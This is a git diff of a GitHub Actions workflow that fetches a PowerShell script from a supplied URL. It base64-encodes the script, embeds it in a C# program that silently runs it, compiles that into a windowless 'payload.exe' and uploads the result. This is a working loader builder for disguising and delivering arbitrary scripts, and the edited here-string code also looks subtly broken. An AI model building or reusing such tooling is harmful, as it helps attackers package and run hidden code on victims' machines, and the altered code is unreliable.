@@ -13,67 +13,49 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    # Step 1: Check out the repository
     - name: Checkout code
       uses: actions/checkout@v3
 
-    # Step 2: Fetch the PowerShell script from the provided URL
     - name: Fetch Payload from URL
       run: |
         $url = '${{ github.event.inputs.payload_url }}'
-        $payload = Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'
-        Write-Host "[INFO] Payload script downloaded."
+        Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'
 
-    # Step 3: Convert the PowerShell script to Base64
     - name: Convert PowerShell script to Base64
       run: |
         $script = Get-Content -Path 'payload.ps1' -Raw
         $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($script))
-        $b64 | Out-File -FilePath 'base64_payload.txt'
-        Write-Host "[INFO] PowerShell script converted to Base64."
+        Set-Content -Path 'base64_payload.txt' -Value $b64
 
-    # Step 4: Create C# Code with Base64 PowerShell Payload
     - name: Generate C# code
+      shell: powershell
       run: |
         $b64 = Get-Content -Path 'base64_payload.txt' -Raw
         $csharp_code = @"
-using System;
-using System.Management.Automation;
-using System.Management.Automation.Runspaces;
+        using System;
+        using System.Management.Automation;
+        using System.Text;
 
-class Program {
-    static void Main() {
-        string b64 = "$b64"; 
-        string script = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64));
-
+        class Program {
+        static void Main() {
+        string b64 = ""{B64_PLACEHOLDER}"";
+        string script = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
         using (PowerShell ps = PowerShell.Create()) {
             ps.AddScript(script);
             ps.Invoke();
         }
-    }
-}
-"@
-        $csharp_code | Out-File -FilePath 'Program.cs'
-        Write-Host "[INFO] C# code generated with embedded Base64 payload."
+        }
+        }
+        "@ -replace "{B64_PLACEHOLDER}", $b64
 
-    # Step 5: Compile C# Code into EXE using csc.exe
+        Set-Content -Path 'Program.cs' -Value $csharp_code
+
     - name: Compile C# code into EXE
       run: |
         & "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:winexe /out:payload.exe Program.cs
-        Write-Host "[INFO] C# code compiled into EXE."
 
-    # Step 6: List the contents of the output directory
-    - name: List contents of the output directory
-      run: |
-        dir
-
-    # Step 7: Upload the executable as an artifact
     - name: Upload executable
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
         path: payload.exe
-        if-no-files-found: warn
-        compression-level: 6
-        overwrite: false
-        include-hidden-files: false
